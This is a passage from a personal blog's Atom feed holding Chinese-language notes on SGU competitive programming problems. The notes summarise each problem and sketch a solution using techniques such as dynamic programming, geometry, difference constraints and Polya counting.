<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mcginn&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://mcginn7.github.io/"/>
  <updated>2021-08-29T15:18:36.586Z</updated>
  <id>http://mcginn7.github.io/</id>
  
  <author>
    <name>Mcginn</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SGU-301-350</title>
    <link href="http://mcginn7.github.io/2021/06/27/SGU-301-350/"/>
    <id>http://mcginn7.github.io/2021/06/27/SGU-301-350/</id>
    <published>2021-06-27T07:44:24.000Z</published>
    <updated>2021-08-29T15:18:36.586Z</updated>
    
    <content type="html"><![CDATA[<p>345 Revolution</p><p><strong>题意</strong> 给 $3\le N\le 5\times 10^4$ 个点的凸包，有 $1\le P\le 5\times 10^4$​ 次询问：每次询问给一条直线，若凸包被直线切分成 2 部分，求较小部分的面积。</p><p><strong>分析</strong> 计算几何。凸包面积使用叉积计算后可以使用前缀和快速计算，假设已知直线和凸包的交点，就可以 O(1) 求得切割部分面积。</p><p>利用叉积计算将凸包点集区分成左右两部分，由于凸包的点是有序的，那么就可以得到与直线相交的线段。</p><hr><p>344 Weed</p><p><strong>题意</strong> 给 $N\times M(1\le N,M\le 1000)$ 网格，每个格子上要么长了杂草要么没长。当一个没长杂草的格子有 2 个及以上长杂草的相邻格子，那么这个格子之后也会长杂草。求最终网格图中每个格子的状态。</p><p><strong>分析</strong> 模拟。</p><hr><p>? 343 VaR</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>342 Reihenfolge</p><p><strong>题意</strong> 给一大整数 $A(1\le A\le 10^{3000})$​ 以及正整数 $B(1\le B\le 10^6)$​，令 $A=s_1B^{k_1}+s_2B^{k_2}+\dots+s_nB^{k_n}$​，其中 $|s_i|=1$​，求最小需要个数 $n$​。</p><p><strong>分析</strong> 记 $k_n\ge k_{n-1}\ge\dots\ge k_1$​，当 $k_1\gt 0$ 时，问题转换成 $A/B$ 的最小个数 $n’$。当 $k_1=0$ 时，令 $A=A’B+r(0\lt r\lt B)$，此时花费代价 $r$ 转移至状态 $A’$；另一种表示为 $A=(A’+1)B-(B-r)$，含义为花费代价 $B-r$ 转移至状态 $A’+1$。</p><p>表面上每次状态转移都会产生新的 2 种状态，实质上<strong>再走一步</strong>可以发现 $A’$ 和 $A’+1$ 的两个后继状态也是相同的（可记为 $A’’$ 和 $A’’+1$），套用 DP 思想即可。</p><p><strong>代码</strong> <a href="https://github.com/McGinn7/Template-for-ICPC/blob/master/SGU/342.java" target="_blank" rel="noopener">342.java</a></p><hr><p>? 341Circuits</p><p>题意</p><p>分析</p><hr><p>340 TeX2HTML</p><p><strong>题意</strong> 解析 tex 中的公式表达，转换成 HTML 标签。</p><p><strong>分析</strong> parser。</p><hr><p>339 Segments</p><p><strong>题意</strong> 增加、删除一维坐标上的线段：$+\ L\ R$ 添加线段 $[L, R]$ 并输出该区间内的线段数量；$-\ L \ R$ 若存在一条线段 $[L, R]$ 则删除。操作次数 $1\le Q\le 2.5 \times 10^5$。</p><p><strong>分析</strong> 二维线段树。</p><hr><p>338 </p><hr><p>337 Keven</p><p><strong>题意</strong> 若长度为偶数的字符串前半部分和后半部分不同的字符数量不超过 $K$，则定义为 $K_{even}$ 字符串。给定整数 $K$ 和初始长度为奇数且不超过 2000 的循环字符串，求循环字符串中长度最长的 $K_{even}$ 子串。</p><p><strong>分析</strong></p><hr><p>336 Elections</p><p><strong>题意</strong> 有 $1\le N\le 10^5$ 个党派参加选举，不同党派存在竞争关系，因此党派 $a$ 可能收集有党派 $b$ 的负面未公开消息。为了赢得选举党派可能组成集团共享信息来最大化选举成功的概率。</p><p>现模拟 $1\le Q\le 2\times 10^5$ 次操作：</p><ol><li>$1\ a\ b$，操作 1 需判断党派/集团 $a$ 是否掌握有党派/集团 $b$ 的负面消息；</li><li>$2\ a\ b$，操作 2 表示党派/集团 $a$ 和党派/集团 $b$​ 形成集团并共享信息。</li></ol><p><strong>分析</strong> 食物链。</p><hr><p>? 335 Thiefs And Cops</p><p><strong>题意</strong>  在 $H\times W(1\le H, W\le 5\times 10^8)$​ 的网格图上，已知警察的初始坐标 $(X_c, Y_c)$​ 和小偷的初始坐标 $(X_t, Y_t)$​​。警察和小偷均知道自己和对方的位置，然后轮流行动，每次行动<strong>必须</strong>移动到相邻的格子上。警察希望尽快抓到小偷，而小偷则希望自己被抓的时间越晚越好。求警察最快抓到小偷的时间，或判断抓不到。</p><p><strong>分析</strong> </p><hr><p>334 Tiny Puzzle</p><p><strong>题意</strong> 给 9 个小方块的坐标，通过平移将这些方块组合成 3×3 的正方形。对于联通的小方块可分成一组形成联通块，但不能旋转或翻转。求最少需要分成多少组就可以通过平移组成 3×3 的正方形。</p><p><strong>分析</strong> $9!$ 枚举小方块在正方形中的位置，然后再求联通块的数量。</p><hr><p>333 Random Shooting</p><p><strong>题意</strong> 在大小为 $100\times 100$​​ 的正方形板上有一个 $3\le N\le 8$​​ 个点的凸包，随机撒 2 个点在板上，求线段与凸包有交的概率。当线段任一点在凸包内时，则认为线段和凸包有交。</p><p><strong>分析</strong></p><p><strong>参考</strong> <a href="https://blog.csdn.net/woshitanwei/article/details/7353152" target="_blank" rel="noopener">SGU 333 Random Shooting +数据加强版</a></p><hr><p>332 Largest Circle</p><p><strong>题意</strong> 给 $3\le N\le 10^4$ 个点凸包，求凸包内最大圆面积。 </p><p><strong>分析</strong> 二分半径 R，凸包拆解成半平面，半平面的直线向“内”平移 R 后求半平面交，若面积大于0 说明凸包能包含半径 R 的圆，反之不行。</p><hr><p>331 Traffic Jam</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>330 Numbers</p><p><strong>题意</strong> 给两数 $A, B(2\le A\lt B\le 10^{12})$。每次选择 $A$ 的一个约数 $d$ 累加，即 $A’=A+d,d|A$。判断是否能在 500 次操作内将 $A$ 转换成 $B$。</p><p><strong>分析</strong> 从二进制的角度考虑。</p><hr><p>329 Black-and-White Triangle</p><p><strong>题意</strong> 长度为 $1\le N\le 5$ 的大等边三角形划分成 $N^2$​ 个小三角形，每个小三角形有 4 种染色样式。现给定 4 种染色样式的数量，求染色方案数使得相邻三角形的相邻边是同一颜色。</p><img src="/2021/06/27/SGU-301-350/sgu_329.png" title="染色样式"><p><strong>分析</strong> $dp(i, j, x_1, x_2, x_3, x_4, mask, last)$ 表示染色至格子 $(i, j)$​ 染色样式各使用了 $x_1, x_2, x_3, x_4$ 以及过去 $N$ 个小三角形向下边的颜色状态 $mask$，前一个小三角形相邻边的颜色为 $last$ 的染色方案数。</p><hr><p>? 328 A Coloring Game</p><p><strong>题意</strong> $1\le N\le 10^5$​ 个位置排成一排，每个位置有 3 种状态：未染色；黑色；白色。2 名玩家轮流给未染色的位置染色，要求相邻位置不能染相同颜色。不能进行染色的玩家失败，在两名玩家都采取最优操作的条件判断先手胜或后手胜。</p><p><strong>分析</strong></p><hr><p>327 Yet Another Palindrome</p><p><strong>题意</strong> 给 $1\le N\le 14$ 个仅包含小写拉丁字母的字符串 $S_i(1\le |S_i|\le 30)$，求一个最短回文串使得所有 $S_i$ 都是其连续子串。</p><p><strong>分析</strong> 每个字符串可能出现回文串的前半部分、后半部分、跨越对称轴三种情况。根据回文串的性质，若 $S_i$ 出现在后半部分，将其翻转后就出现在了回文串的前半部分，因此只需要考虑出现在回文串前半部分和跨越对称轴 2 种情况。因为 $N\le14$ 不大，可以尝试 DFS 或直接状压 DP 记录当前回文串的前半部分。跨域对称轴的情况需要特殊处理。</p><hr><p>326 Perspective</p><p><strong>题意</strong> 有 $2\le N\le 20$​ 支队伍，每支队伍最多再参加 $r_i$​ 场比赛，第 i 支队伍和第 j 支队伍允许最多进行 $a_{i,j}$​ 场比赛。每场比赛必然会分成胜负，获胜方得分 +1。目前每只队伍得分为 $w_i$​​，是否存在一种比赛结果使得第 1 支队伍最后得分最大（允许和其他队伍得分并列）。</p><p><strong>分析</strong> 显然，第 1 支队伍的所有场次均获胜，即最后得分为 $w_1+\min (r_1, \sum a_{1,j})$。剩下的问题就是分配其他队伍的比赛胜负使得最大值不超过第一支队伍的最后得分。</p><p>一种比较显然（但不简单）的做法是构造网络流：左部分点表示比赛，右部分点表示队伍，根据题意构造边的流量即可。</p><hr><p>325 Palindrome</p><p><strong>题意</strong> 给长度为 $10^6$ 仅包含大写拉丁字母的字符串，每次操作交换相邻的两个字符，求最少操作次数使得字符串变成回文串。若不能转化成回文串，输出 -1。</p><p><strong>分析</strong> 同一字符的相对顺序不变，因此可以知道每个字符在回文串中相匹配的字符。基于这个观察，从外向内<strong>贪心</strong>模拟这个匹配过程即可。</p><hr><p>324 The Text Formatting</p><p><strong>题意</strong></p><p><strong>分析</strong> 模拟。</p><hr><p>323 Aviamachinations</p><p><strong>题意</strong> Berland 上有 $1\le N\le 2000$​ 座城市，$1\le M\le 2000$​ 家航空公司经营着 $0\le K\le 2\times 10^5$​​​ 条航线。每条航线往返于两座城市之间，由其中一家公司经营且有一个出售价格 $1\le P_i\le 10^5$​。两座城市之间可能存在多条不同公司经营的航线。现在某一家公司要去收购其他公司的航线，使得任意两座城市都可以通过中转航线到达，求最小收购价格。</p><p><strong>分析</strong> 模拟+最小生成树。暴力做法是，枚举垄断公司，先用该公司的航线合并相互可达的城市，然后从头搞一遍最小生成树求最小价格。暴力做法的时间复杂度是 $O(MK)$，显然是会超时的。</p><p>从另一个角度入手，在不考虑垄断公司的前提下，先求最小生成树，然后往树上加垄断公司的航线边，再去掉环上价格最高的边即可。但这个做法要做到 $O(MN)$ 是比较困难的。</p><p>从结果角度来看，垄断公司的航线不是自家经营的航线，就是在最小生成树上的航线，也就是暴力做法中只需要枚举最小生成树上的边即可。</p><hr><p>322 The Great Union</p><p><strong>题意</strong> 给 2 棵 $1\le N\le 2000$​​ 个点的树，需要通过若干操作将 2 棵树改成完全一致：往树上加一条边，然后去除环上的一条边使得操作后仍是一棵树。求最少的操作次数。</p><p><strong>分析</strong> 最少次数为非公共边的数量。每次往树 A 加树 B 的边，然后去除环上的非公共边。</p><hr><p>321 The Spy Network</p><p><strong>题意</strong> 给定一棵 $1\le N\le 2\times 10^5$ 个节点根为 1 的有根数，树边权重为 0 或 1，要求任意节点到根的边权和大于等于路径长度的一半。在允许修改边权的操作下，求最少需要修改多少条边的边权，并给出任一方案。</p><p><strong>分析</strong> 贪心+二分。显然地，修改的树边距离根越近越好，对于每个节点可以二分其到根路径上的边界点，边界点以上树边的边权都修改为 1。</p><hr><p>320 The Influence of the Mafia</p><p><strong>题意</strong> 给 $N\times M(1\le N,M\le 500)$ 大小的网格图，该图被划分成若干联通区域，同一区域使用同一数字表示，数字范围是 0 到 9。若一片区域所占据的格子数不少于 $K$，则这片区域中的任一格子都不能通行。求能到达网格图边界的格子数量。</p><p><strong>分析</strong> 模拟+BFS。</p><hr><p>319 </p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>318 Grants</p><p><strong>题意</strong> 有 $1\le M\le 100$ 个用户以及 $1\le N\le 100$ 个文件，每个用户有需要访问的文件集合 $S_i$。管理员通过设定用户组下发文件的访问权限：每个文件最多分配给一个用户组；用户可以加入任意多的用户组，但必须也仅能访问需要的文件集合。求管理最少需要划分多少个用户组来满足用户的访问需求。</p><p><strong>分析</strong></p><hr><p>317 Fast Ride</p><p><strong>题意</strong> 有 $1\le N\le 5000$ 个马厩，第 i 个马厩位置在 $0\le X_i\le 10^8$ 且有 $0&lt;M_i$ 匹马。第 j 只马速度为 $1\le v_j\le 10^8$，最大驰骋距离为 $1\le d_j\le 10^8$。从位置 0 骑马到位置 $1\le B\le 10^8$，求最小花费时间。</p><p><strong>分析</strong> DP。</p><hr><p>316 Code Tanks</p><p><strong>题意 </strong> (省略)</p><p><strong>分析</strong> 模拟。</p><hr><p>315 </p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>314 Shortest Paths</p><p><strong>题意</strong> 给定 $2\le N\le 10^4$ 个点，$2\le M\le 5\times 10^4$ 条边的有向图，求 $S$ 到 $T$ 前 $2\le K\le 10^4$ 条最短路径长度。</p><p><strong>分析</strong> K 短路模板题。</p><p><strong>参考</strong> <a href="https://zhuanlan.zhihu.com/p/56269536" target="_blank" rel="noopener">从枚举到 K 短路 - 知乎 (zhihu.com)</a></p><hr><p>313 Circular Railway</p><p><strong>题意</strong> $2\le L\le 10^9$ 个点均匀分布到环形上，顺序标号 1 至 $L$，相邻点距离为 1。分别有 $1\le N\le 50000$ 个起点和终点，分配起点和终点一一映射，使得总距离和最小。求最小总距离和以及一种分配方案。</p><p><strong>分析</strong> 当点分布在链上时，贪心即可：从左往右，能匹配就匹配。</p><p>将环拆成链，枚举环的拆分位置，然后退化成链的做法，时间复杂度为 $O(N^2)$。</p><p>考虑逐格递推，即考虑每条线段对于总距离的贡献。记起点值为 $+1$，终点为 $-1$，线段长度为 $L_i$，那么每条线段的距离贡献为：$|PrefixSum(i)|\times L_i$。当 $PrefixSum(i)&gt; 0$ 时，线段左侧的起点需要到线段右侧找相匹配的终点，因此最终方案必须穿过 $PrefixSum(i)$ 次。</p><p>剩下的问题就是考虑将绝对值符号去掉，这里可以使用离线+树状数组维护。</p><p><strong>代码</strong> <a href="https://github.com/McGinn7/Template-for-ICPC/blob/master/SGU/313.cpp" target="_blank" rel="noopener">sgu 313</a></p><hr><p>312 4-3 King</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>311 Ice-cream Tycoon</p><p><strong>题意</strong> 有 $10^5$ 次操作，操作分 2 种：ARRIVE n c，表示有 n 个值为 c 的数；BUY n t，取当前最小的 n 个数且总和不超过 t，若满足条件输出 HAPPY 否则输出 UNHAPPY。</p><p><strong>分析</strong> 线段树模拟。</p><hr><p>310 Hippopotamus</p><p><strong>题意</strong> 长度为 $1\le N\le 60$ 二进制串，任意连续长度为 $1\le M\le 15$ 的窗口中至少需要包含 $0\le K\le M$ 个 1，求满足条件的二进制串数量。</p><p><strong>分析</strong> $dp(i, mask)$ 表示当前长度为 $i$ 最后 $M$ 位状态为 $mask$ 的方案数。</p><hr><p>309 Real Fun</p><p><strong>题意</strong> 给二维平面上 $4\le N\le 20000$ 个点 $(x, y), |x|,|y|\le 10^9$，使用 3 个相同的正方形覆盖所有点，求正方形最小边长。</p><p><strong>分析</strong> 聚类？</p><hr><p>308 Hyperboloid Distance</p><p><strong>题意</strong> 给定单页双曲面 $x^2+y^2-z^2=1$ 以及表面上两点 $A(x_A, y_A, z_A), B(x_B, y_B, z_B), -1\le z_A, z_B\le 1$，求 $AB$ 在双曲面上的距离。</p><p><strong>分析</strong> 微分法。</p><hr><p>307 Cipher</p><p><strong>题意</strong> 给定大小为 $(H-1)\times (W-1), 2\le H,W\le 300$ 的矩阵 $B$，矩阵 $A$ 和矩阵 $B$ 满足关系式  $B_{i,j}=A_{i,j}+A_{i+1,j}+A_{i, j+1}+A_{i+1,j+1}$。求矩阵 $A$，或判断无解。</p><p><strong>分析</strong> 若已知矩阵 $A$ 的第一行和第一列，结合矩阵 $B$ 可倒推出整个矩阵 $A$：</p><script type="math/tex; mode=display">A_{i+1,j+1}=B_{i,j}-A_{i,j}-A_{i+1,j}-A_{i, j+1}</script><p>进一步推导可得，在不考虑矩阵 $B$ 的情况下，$A_{i, j}$ 仅和 $A_{0,0}, A_{i,0}, A_{0, j}$ 有关：</p><script type="math/tex; mode=display">A_{i,j}=(-1)^{i+j+1}A_{0,0}+(-1)^jA_{i,0}+(-1)^iA_{0,j}</script><p>枚举 $A_{0, 0}$，原问题转化成一个 2-sat 问题：$A_{i,0}$ 和 $A_{0, j}$ 的相关性。</p><hr><p>306</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>305</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>304</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>303</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>302</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>301</p><p><strong>题意</strong></p><p><strong>分析</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;345 Revolution&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题意&lt;/strong&gt; 给 $3\le N\le 5\times 10^4$ 个点的凸包，有 $1\le P\le 5\times 10^4$​ 次询问：每次询问给一条直线，若凸包被直线切分成 2 部分，求较小部分
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Deep Retrieval</title>
    <link href="http://mcginn7.github.io/2021/06/13/Deep-Retrieval/"/>
    <id>http://mcginn7.github.io/2021/06/13/Deep-Retrieval/</id>
    <published>2021-06-13T11:17:35.000Z</published>
    <updated>2021-06-13T11:18:06.050Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="DR" scheme="http://mcginn7.github.io/tags/DR/"/>
    
  </entry>
  
  <entry>
    <title>SGU-253-300</title>
    <link href="http://mcginn7.github.io/2021/04/24/SGU-253-300/"/>
    <id>http://mcginn7.github.io/2021/04/24/SGU-253-300/</id>
    <published>2021-04-24T04:38:12.000Z</published>
    <updated>2021-06-27T07:47:43.625Z</updated>
    
    <content type="html"><![CDATA[<p>300 Train</p><p><strong>题意</strong> 给定水平/垂直方向的火车轨道顶点顺序，在不发生碰撞的前提下，求火车的最大长度。轨道顶点数为 $1\le N\le 4000$，点坐标 $(x_i, y_i), |x_i|, |y_i|\le 10^4$。</p><p><strong>分析</strong> 模拟。将点坐标离散化成 $N\times N$ 的网格图，记录当前火车所占据的线段以及车头/车尾坐标，模拟火车行进和碰撞。模拟过程中，记录火车的最大长度。</p><hr><p>299 Triangle</p><p><strong>题意</strong> 有 $3\le N\le 1000$ 个大数 $1\le a_i\le 10^{500}$，找出 3 个数使之能构成三角形的边。</p><p><strong>分析</strong> 模拟+大数。排序，取相邻的 3 个数判断即可。</p><hr><p>298 King Berl VI</p><p><strong>题意</strong> $2\le N\le 10^4$ 个变量 $A_i$，$0\le M\le10^5$ 个约束：$A_i\ge A_j + C_k, 0\le C_k\le 10^3$。要求解 $|A_i|\le 10^4$，且最小化 $A_N-A_1$。判断是否有解，若有解输出任一方案。</p><p><strong>分析</strong> 差分约束。</p><ol><li><p><strong>差分约束系统</strong> 是 $n$ 元一次不等式组，有 $n$ 个变量 $x_1, x_2, \dots, x_n$ 以及 $m$ 个约束条件 $x_i-x_j\le C_k$。求一组解 $(x_1, x_2, \dots, x_n)=(a_1, a_2, \dots, a_n)$ 满足所有的约束条件。</p></li><li><p>对于形如 $x_i-x_j\le C_k$ 的约束条件，可以转换成 $x_i\le x_j+C_k$，这与<strong>单源最短路</strong>中的三角不等式 $dist_i\le dist_j+cost(j, i)$ 类似。将变量 $x_i$ 视为有向图中的节点，约束条件 $x_i-x_j\le C_k$ 视为一条边权为 $C_k$ 且从 $j$ 向 $i$ 的<strong>有向边</strong>，同时添加从<strong>超级源点</strong>到每个点的有向边，边权视情况设置。从而将差分约束问题转化成单源最短路问题。</p></li><li><p>在某个变量确定的情况下，形如 $x_i-x_j\le C_k$ 约束条件的问题下，单源最短路给出一种<strong>最大解</strong>。对于从超级源点 $S$ 到 $T$ 的任意一条路径 $P=(S,v_1, v_2, \dots,v_n,T)$，有约束条件：</p><script type="math/tex; mode=display">x_{v_1} -x_S\le 0 \\x_{v_2} -x_{v_1}\le w(v_1, v_2) \\\dots \\x_{T} -x_{v_n}\le w(v_n,T) \\</script><p>相加得到 $x_T-x_S\le w(P)$，其中 $w(P)=w(v_1,v_2)+\dots+w(v_n,T)$。</p><p>记 $P^{\ast}$ 为最短路，有 $x_T-x_S\le w(P^\ast)\le w(P)$，即 $x_T$ 的<strong>最大值</strong>为 $x_S+w(P^\ast)$。</p></li><li><p>对于形如 $x_i-x_j\ge C_k$ 的差分约束问题，类比单源最长路 $dist_i\ge dist_j+cost(j,i)$ 的三角不等式，将问题转换成单源最长路问题，得到的解为最小解。</p></li><li><p>如何求解单源最长路？单源最长路和单源最短路问题是<strong>对偶</strong>的。定义原图为 $G(V, E)$，有向边为 $w(i, j)$。将<strong>边权取反</strong>后得到对偶图 $G’(V, E)$，新的有向边为 $w’(i, j)=-w(i, j)$。对于任一路径 $p$ 有 $w(p)=-w’(p)$。显然，对偶图 $G’(V, E)$ 的最短路对应原图 $G(V, E)$ 的最长路。</p></li><li><p>回到 SGU 298 问题上，要让 $A_N-A_1$ 尽可能小，想法是让 $A_1$ 尽可能大而 $A_N$ 尽可能小。做法是先构造 $A_j\le A_i+(-C_k)$ 让 $A_1$ 尽可能大，然后构造 $A_i\le A_j+ C_k$ 让 $A_N$ 尽可能小。</p></li></ol><p><strong>参考</strong> <a href="https://oi-wiki.org/graph/diff-constraints/" target="_blank" rel="noopener">OI Wiki-差分约束</a>；<a href="https://www.cnblogs.com/jffifa/archive/2012/05/12/2497072.html" target="_blank" rel="noopener">最短路、最长路与差分约束的最大解、最小解</a>。</p><hr><p>297 Fair-play</p><p><strong>题意</strong> （简单题）</p><p><strong>分析</strong> 模拟。</p><hr><p>296 Sasha vs. Kate</p><p><strong>题意</strong> 给一大数 $1\le N\le 10^{1000}$，求从 $N$ 去掉 $0\le K\le 999$ 个数位后的最大值。</p><p><strong>分析</strong> 贪心。</p><hr><p>295 Identifier Duplicated!</p><p><strong>题意</strong> 给定一字符串，求长度介于$[q, c],1\le q\le c\le 63$ 等价的字符串数量。若一个字符串经过若干次操作转换成另一字符串，则这两个字符串等价。允许的操作有：</p><ol><li>使用相同的拉丁字符替换成俄文字符，反之亦然。</li><li>改变单词之间的空格符数量，但不能完全删除。</li><li>添加前导/尾部空格。</li></ol><p><strong>分析</strong> 模拟。</p><hr><p>294 He’s Circles</p><p><strong>题意</strong> 使用 2 种颜色对长度为 $1\le N\le 2\times10^5$ 的项链染色，在旋转置换的条件下求本质不同的染色方案。</p><p><strong>分析</strong> Polya+BigNumber。</p><hr><p>293 Game with Q an C</p><p><strong>题意</strong> 有长度为 $2n-1(1\le n\le 2005)$ 且仅包含 ‘Q’, ‘C’ 俩字符的字符串，按顺序逐个添加字符构造新字符串，每次添加一个字符后可<strong>选择性</strong>地交换 2 个位置上的字符。要求当新字符串长度为<strong>奇数</strong>时是回文串，判断是否可行，若可行则输出任一方案。</p><p><strong>分析</strong> 构造。考虑一次性添加 2 个字符，维护 $\overline Q \overline C x\overline C \overline Q$ 格式，其中 $x$ 表示回文中心，$\overline Q$ 表示连续字符 Q，分 CC, CQ, QC, QQ 四种情况考虑即可。</p><hr><p>292 Field for the Cemetery</p><p><strong>题意</strong> 在 $q\times c(0\le q, c\le 10^{1000})$ 的棋盘上最多能放置多少个 $n\times 1(1\le n\le 10^{1000})$ 个长方形。</p><p><strong>分析</strong> 模拟。</p><hr><p>291 Evolution</p><p><strong>题意</strong> 在 $q\times c(1\le q,c\le 1000)$ 大小的网格图上有 $1\le n\le 22204$ 种细菌族，第 $i$ 种细菌族初始位置为 $(x_i, y_i)$ 且第 $i$ 秒才开始分裂。细菌族每秒钟从 $(x, y)$ 向 $(x-1, y),(x+1,y),(x,y-1),(x,y+1)$ 四个方向分裂：不会向已有细菌格子的方向分裂。求 $0\le t\le 10^9$ 秒后第 $i$ 中细菌族占领的格子数量。</p><p><strong>分析</strong> 模拟。BFS。</p><hr><p>290 Defend the Milky Way</p><p><strong>题意</strong> 给三维空间中 $1\le N\le 100$ 个点，求在凸包顶点/平面上的点。</p><p><strong>分析</strong> 计算几何。</p><hr><p>289 Challenging Tic-Tac-Toe</p><p><strong>题意</strong> OOXX 游戏。给定一个初始局面，假设玩家都玩得很好的情况下，判断先手必胜/必败/平局/非法。非法是在游戏过程中不可能出现的局面。</p><p><strong>分析</strong> 模拟。总共局面数为 $3^9=19683$ 种。</p><hr><p>288 Best Tournament Schedule</p><p><strong>题意</strong> 有 $1\le N\le 2005$ 支队伍参加巡回赛，所有队伍两两之间都需安排一次比赛，要求同一巡回赛中每支队伍最多只参加一场比赛。求最少巡回赛轮数，并输出任一方案。</p><p><strong>分析</strong> 构造。</p><p>当 $N$ 为偶数时，巡回赛最少轮数为 $C(N,2)/(N/2)=N-1$。$N$ 为偶数的构造方案如下：</p><ol><li>前 $[1, N-1]$ 行，$f(i, j) = (i - 1 + j - 1)\pmod {N-1}$；</li><li>第 $N$ 行，$f(N, j)=(N-1+2j)\pmod {N-1}$ 。</li></ol><p>当 $N$ 为奇数时，巡回赛最少轮数为 $C(N,2)/({N-1}/2)=N$。添加一支虚拟队伍转化成队伍数为偶数的情况构造。</p><p><strong>代码</strong> <a href="https://github.com/McGinn7/Template-for-ICPC/blob/master/SGU/288.cpp" target="_blank" rel="noopener">sgu 288</a></p><hr><p>287 Amusing Qc Machine</p><p><strong>题意</strong> 在 $[1, q]$ 中猜一个秘密数字，程序每次返回猜测值和秘密值的大小/相等关系。但是存在 $0\le c\le 10^6$ 延迟：第 $i$ 次猜测结果在第 $i+c$ 次猜测后返回。求最坏情况下猜中秘密数字的猜测次数。</p><p><strong>分析</strong> $f(i)$ 表示 $i$ 轮交互后猜测值的数量。因为延迟 $c$ 存在，第 $i$ 次猜测只能基于前 $i-c-1$ 轮交互的已知结果。前 $i-c-1$ 轮共有 $f(i-c-1)$ 个值，划分成 $f(i-c-1) + 1$ 个区间，第 $i$ 轮猜测值必然是在这些区间中，因此共有 $f(i-c-1)+1$ 枚举值。</p><p>则转移方程为 $f(i)=f(i-1)+f(i-c-1)+1$。 </p><hr><p>286 Ancient decoration</p><p><strong>题意</strong> $N$ 个点的无向图，已知每个点的度数为 $K$ 且 $K$ 为<strong>偶数</strong>。要求给边染色使得每个点<strong>恰好</strong>在 2 条染色边上，判断是否存在可行方案，若存在则输出任一方案。</p><p><strong>分析</strong></p><p><strong>Tips</strong> 欧拉回路。</p><hr><p>285 What? Where? When?</p><p><strong>题意</strong> 已知有 13 个问题，除第 13 个问题有 $1\le N\le 1000$ 个候选外，1 至 12 号问题仅有一个候选。每次随机从 1 至 13 个问题中随机抽取一个问题，若答题者回答正确则 +1 分否则提问者 +1 分，答题者或提问者率先取得 6 分则游戏结束。给定答题者对于所有问题回答正确的概率，求所有可能局面（’6:0’, ‘6:1’, ‘6:2’, ‘6:3’, ‘6:4’, ‘6:5’, ‘5:6’, ‘4:6’, ‘3:6’, ‘2:6’, ‘1:6’, ‘0:6’）的概率。</p><p><strong>分析</strong> 状压 DP。</p><hr><p>284 Grammar</p><p><strong>题意</strong> 有 $1\le N\le 30$ 个字符串 $S_i, 1\le i\le N$，由基本字符 ‘a’, ‘b’ 或 $S_j, j\lt i$ 构成。给定查询字符串 $T,|T|\le 100$，求串 $T$ 在 $S_N$ 中的出现次数。数据保证 $\sum |S_i| \le 500$。</p><p><strong>分析</strong> KMP 算法。对于每个字符串 $S_i$ 记忆 $dp(i, j)$，表示从 $T_j$ 位置开始匹配 $S_i$ 最终成功匹配 $T$ 的次数，$prefix(i, j)$ 表示匹配完 $S_i$ 后匹配 $T$ 的前缀长度。</p><hr><p>283 Mechanics</p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>282 Isomorphism</p><p><strong>题意</strong> 给 $1\le N\le 53$ 个点的完全图，每条边染上 $1\le M\le 1000$ 种颜色中的一种。如果一张图完全图通过重标号点构成另一张图，定义这两张图同构。求本质不同的异构图数量，结果对 $P$ 取模且 $P$ 为素数。</p><p><strong>分析</strong> 该问题本质上是在求边的置换然后使用 polya 定理计数，而边置换是通过点置换得到的，因此从点置换入手。</p><p>假设有一条边 $(u, v)$，分点 $u, v$ 是否在同一<em>点循环置换</em>中考虑。</p><ol><li><p>若点 $u, v$ 在相同 <em>k-循环</em>中，即循环中的元素为 $k$ 个。显然，边 $(u, v)$ 所在的<strong>边循环置换</strong>同样有 $k$ 个元素，而 $k$ 个点的子图共有 $C_k^2$ 条边，因此<strong>边循环个数</strong>为 $\frac {C_k^2}{k}=\frac{k-1}{2}$。</p><p>注意，当 $k$ 为偶数时且 $u,v$ 在点循环置换中间隔 $\frac k2$ 时，边 $(u, v)$ 所在的边循环置换中仅有 $\frac k2$ 个元素。因为经过 $\frac k 2$ 次置换后，边 $(u, v)$ 重复出现了。将这种边循环单独考虑，此时边循环个数为 $\frac {C_k^2-\frac k2}{k}+1=\frac k 2$。</p><p>综上所述，若点 $u, v$ 在相同点循环置换中，相应的边循环个数为 $\lfloor \frac k 2\rfloor$。 </p></li><li><p>若点 $u, v$ 不在相同点循环中时，假设两个点循环的元素个数分别为 $k_1, k_2$，那么边 $(u, v)$ 所在的边循环置换有 $LCM(k_1, k_2)$ 个元素以及总共有 $k_1k_2$ 条边，因此边循环个数为 $\frac {k_1k_2}{LCM(k_1, k_2)}=GCD(k_1,k_2)$。</p></li></ol><p>在已知边循环个数 $(f)$ 的前提下，根据 polya 计数本质不同的染色方案数为 $M^{(f)}$。</p><p>剩下的问题便是枚举点置换方案，然后计算相应的边循环个数即可。在枚举点置换方案时，只关心各个循环的大小而不是具体元素，问题转化成将 $N$ 拆解成 $k_i$ 使得 $\sum k_i=N$ 且 $k_i\le k_{i+1}$，$k_i$ 表示第 $i$ 个点循环的元素个数。</p><p>在得到各个点循环大小后，通过排列组合将具体元素放进循环中，得到本质不同的点置换方案即可。首先，假设 $k_i$ 两两不同，则点分配方案数为 $C_N^{k_1}C_{N-k_1}^{k_2}\dots=\frac {N!}{k_1!k_2!\dots k_m!}$。如果存在若干个相同的 $k_i$，即存在相同大小的点循环，这些循环本身没有先后之分，但是前述枚举会重复统计。将点置换方案重新记为大小为 $x_i$ 的循环有 $c_i$ 个，则点分配方案数为 $\frac {N!}{\prod (x_i!)^{c_i}c_i!}$。此外，一个循环中的元素是有顺序的，大小为 $k$ 的循环有 